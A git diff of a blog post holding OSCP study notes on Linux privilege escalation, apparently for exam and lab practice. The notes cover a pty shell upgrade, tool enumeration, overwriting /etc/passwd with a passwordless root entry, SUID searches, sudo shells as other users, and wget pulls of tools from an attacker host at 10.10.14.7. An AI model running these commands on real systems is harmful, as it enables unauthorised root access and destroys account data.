@@ -1,25 +1,28 @@
 ---
-title: "OSCP: Linux Privilege Escalation"
+title: "Linux Privilege Escalation"
+Slug: linux-privilege-escalation
 last_modified_at: 2019-11-01T16:20:02-05:00
-categories:
-  - Cyber Security
-tags:
-  - OSCP
-  - Linux
-  - Privilege Escalation
+category: OSCP
+Tags: Penetration Testing, Privilege Escalation
+Authors: Daniel Haggerty
 ---
 
+```
 privesc_linux
 UPGRADE SHELL python -c ‘import pty; pty.spawn("bin/bash")’
 ctrl-Z
 stty raw -echo
 fg
+```
 Enumerate and run this:
+```
 which awk perl python ruby gcc cc vi vim nmap find netcat nc wget tftp ftp 2>/dev/null
-”_ If you don’t see a compiler such as GCC, you know it’s probably not going to be a kernel exploit. So enumerate and use
+```
+If you don’t see a compiler such as GCC, you know it’s probably not going to be a kernel exploit. So enumerate and use
 LinEnum.sh or Linuxprivescchecker.py. I found on one of my 20 point boxes it only perl and wget, so I was looking for priv esc
 related to perl. The other 20 pointer had GCC, so I googled a linux exploit, 2 minutes later I am root.
-BY HAND 1. sudo -l # view users rights has to be tried first for all linux privesc
+BY HAND 
+1. sudo -l # view users rights has to be tried first for all linux privesc
 2. rw on /etc/passwd → echo root::0:0:root:/root:/bin/bash > /etc/passwd → su
 3. bash_history
 4. find / -perm -4000 2>/dev/null # SUID files - detect by date?
@@ -27,9 +30,11 @@ BY HAND 1. sudo -l # view users rights has to be tried first for all linux prive
 6. ps aux | grep root == john mysql -u root
 7. If webserver poke around database
 8. Look at original nmap scan for other shite running (nmap localhost)
+```
 sudo -u anotheruser command run sommand as another user
 sudo -u scriptmanager bash -i #run shell as user scriptmanager
 which awk perl python ruby gcc cc vi vim nmap find netcat nc wget curl tftp ftp 2>/dev/null
+```
 DOWNLOAD ALL LINUX ENUM FILES TO VICTIM cd /opt/linux_privesc
 python -m SimpleHTTPServer
 wget -r 10.10.14.7:8000
